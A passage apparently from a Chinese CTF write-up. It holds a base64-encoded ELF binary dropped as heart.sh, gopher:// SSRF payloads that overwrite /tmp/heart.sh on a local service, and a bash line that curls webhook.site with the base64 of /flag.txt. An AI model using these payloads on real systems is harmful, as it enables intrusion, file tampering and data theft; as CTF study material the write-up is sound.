AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAZWNobyAxMTEgPiAvdG1wL2xvZy50eHQAARsDOzAAAAAFAAAABPD//2QAAAAk8P//jAAAADTw//+kAAAARPD//0wAAAAt8f//vAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAABQAAAAcAAAA8O///yYAAAAARAcQAAAAACQAAAA0AAAAmO///yAAAAAADhBGDhhKDwt3CIAAPxo6KjMkIgAAAAAUAAAAXAAAAJDv//8QAAAAAAAAAAAAAAAUAAAAdAAAAIjv//8QAAAAAAAAAAAAAAAcAAAAjAAAAGnw//8lAAAAAEUOEIYCQw0GXAwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEARAAAAAAAAABEAAAAAAAABAAAAAAAAACkAAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAcBEAAAAAAAAZAAAAAAAAALg9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAwD0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAACwAwAAAAAAAAUAAAAAAAAAgAQAAAAAAAAGAAAAAAAAANgDAAAAAAAACgAAAAAAAACPAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAC4PwAAAAAAAAIAAAAAAAAAGAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAAAQBgAAAAAAAAcAAAAAAAAAUAUAAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAB4AAAAAAAAACAAAAAAAAAD7//9vAAAAAAEAAAgAAAAA/v//bwAAAAAgBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABAFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyD0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAMBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIQAAAAAAAAEdDQzogKFVidW50dSAxMS40LjAtMXVidW50dTF+MjIuMDQuMikgMTEuNC4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAkAAAABAAQAjAMAAAAAAAAgAAAAAAAAABMAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAB4AAAACABAAkBAAAAAAAAAAAAAAAAAAACAAAAACABAAwBAAAAAAAAAAAAAAAAAAADMAAAACABAAABEAAAAAAAAAAAAAAAAAAEkAAAABABoAEEAAAAAAAAABAAAAAAAAAFUAAAABABYAwD0AAAAAAAAAAAAAAAAAAHwAAAACABAAQBEAAAAAAAAAAAAAAAAAAIgAAAABABUAuD0AAAAAAAAAAAAAAAAAAKcAAAAEAPH/AAAAAAAAAAAAAAAAAAAAABMAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAK8AAAABABQA+CAAAAAAAAAAAAAAAAAAAAAAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAL0AAAABABcAyD0AAAAAAAAAAAAAAAAAAMYAAAAAABMAHCAAAAAAAAAAAAAAAAAAANkAAAABABgAuD8AAAAAAAAAAAAAAAAAAO8AAAASAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEoBAAAgABkAAEAAAAAAAAAAAAAAAAAAACgBAAAQABkAEEAAAAAAAAAAAAAAAAAAAC8BAAASAhEAcBEAAAAAAAAAAAAAAAAAADUBAAASAAAAAAAAAAAAAAAAAAAAAAAAAEgBAAAQABkAAEAAAAAAAAAAAAAAAAAAAFUBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAGQBAAARAhkACEAAAAAAAAAAAAAAAAAAAHEBAAARABIAACAAAAAAAAAEAAAAAAAAAIABAAAQABoAGEAAAAAAAAAAAAAAAAAAAE4BAAASABAAYBAAAAAAAAAmAAAAAAAAAIUBAAAQABoAEEAAAAAAAAAAAAAAAAAAAJEBAAASABAASREAAAAAAAAlAAAAAAAAAJYBAAARAhkAEEAAAAAAAAAAAAAAAAAAAKIBAAAgAAAAAAAAAAAAAAAAAAAAAAAAALwBAAAiAAAAAAAAAAAAAAAAAAAAAAAAANcBAAASAgwAABAAAAAAAAAAAAAAAAAAAABTY3J0MS5vAF9fYWJpX3RhZwBjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuMABfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAc2hlbGwuYwBfX0ZSQU1FX0VORF9fAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19saWJjX3N0YXJ0X21haW5AR0xJQkNfMi4zNABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAF9maW5pAHN5c3RlbUBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AX19kc29faGFuZGxlAF9JT19zdGRpbl91c2VkAF9lbmQAX19ic3Nfc3RhcnQAbWFpbgBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnBsdC5zZWMALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAAA4AwAAAAAAADgDAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA2AAAABwAAAAIAAAAAAAAAaAMAAAAAAABoAwAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAASQAAAAcAAAACAAAAAAAAAIwDAAAAAAAAjAMAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAFcAAAD2//9vAgAAAAAAAACwAwAAAAAAALADAAAAAAAAJAAAAAAAAAAGAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABhAAAACwAAAAIAAAAAAAAA2AMAAAAAAADYAwAAAAAAAKgAAAAAAAAABwAAAAEAAAAIAAAAAAAAABgAAAAAAAAAaQAAAAMAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAACPAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAHEAAAD///9vAgAAAAAAAAAQBQAAAAAAABAFAAAAAAAADgAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAB+AAAA/v//bwIAAAAAAAAAIAUAAAAAAAAgBQAAAAAAADAAAAAAAAAABwAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAjQAAAAQAAAACAAAAAAAAAFAFAAAAAAAAUAUAAAAAAADAAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAYAAAAAAAAAJcAAAAEAAAAQgAAAAAAAAAQBgAAAAAAABAGAAAAAAAAGAAAAAAAAAAGAAAAGAAAAAgAAAAAAAAAGAAAAAAAAAChAAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABsAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAnAAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAKcAAAABAAAABgAAAAAAAABAEAAAAAAAAEAQAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACwAAAAAQAAAAYAAAAAAAAAUBAAAAAAAABQEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAuQAAAAEAAAAGAAAAAAAAAGAQAAAAAAAAYBAAAAAAAAAOAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAL8AAAABAAAABgAAAAAAAABwEQAAAAAAAHARAAAAAAAADQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAADFAAAAAQAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAzQAAAAEAAAACAAAAAAAAABwgAAAAAAAAHCAAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAANsAAAABAAAAAgAAAAAAAABQIAAAAAAAAFAgAAAAAAAArAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADlAAAADgAAAAMAAAAAAAAAuD0AAAAAAAC4LQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA8QAAAA8AAAADAAAAAAAAAMA9AAAAAAAAwC0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAP0AAAAGAAAAAwAAAAAAAADIPQAAAAAAAMgtAAAAAAAA8AEAAAAAAAAHAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACrAAAAAQAAAAMAAAAAAAAAuD8AAAAAAAC4LwAAAAAAAEgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAABgEAAAEAAAADAAAAAAAAAABAAAAAAAAAADAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAwBAAAIAAAAAwAAAAAAAAAQQAAAAAAAABAwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAQAAAQAAADAAAAAAAAAAAAAAAAAAAAAQMAAAAAAAAC0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAQDAAAAAAAABgAwAAAAAAAB0AAAASAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAKAzAAAAAAAA3QEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAB9NQAAAAAAABoBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA&quot;|base64 -d &gt; heart.sh</span><br></pre></td></tr></table></figure>

<p>这样&#x2F;tmp&#x2F;heart.sh是可以被执行的</p>
<p>能成功把&#x2F;tmp&#x2F;heart.sh清空的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://localhost:3311/_POST%2520%252F%253Fa%253Dx%2520HTTP%252F1%252E0%250D%250AHost%253A%2520127%252E0%252E0%252E1%253A3311%250D%250AConnection%253A%2520close%250D%250AContent%252DType%253A%2520text%252Fplain%250D%250AContent%252DType%253A%2520multipart%252Fform%252Ddata%253B%2520boundary%253DBOUND%250D%250A%250D%250A%252D%252DBOUND%250D%250AContent%252DDisposition%253A%2520form%252Ddata%253B%2520name%253D%2522content%2522%250D%250A%250D%250Atesttest%250D%250A%252D%252DBOUND%252D%252D</span><br></pre></td></tr></table></figure>

<p>覆写&#x2F;tmp&#x2F;heart.sh为3字节的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://localhost:3311/_POST%2520%252F%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%253A3311%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252011%250D%250AConnection%253A%2520close%250D%250A%250D%250Acontent%253Dpwn</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3311</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=pwn</span><br></pre></td></tr></table></figure>

<p>可以覆写为任意内容了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3311</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">content=%23%21%2Fusr%2Fbin%2Fbash%0Acurl+%09https%3A%2F%2Fwebhook.site%2Fcc2386bf-053e-44d0-8318-0a623b0e8ecc%2F%60cat+%2Fflag.txt%7Cbase64%60</span><br><span class="line"></span><br><span 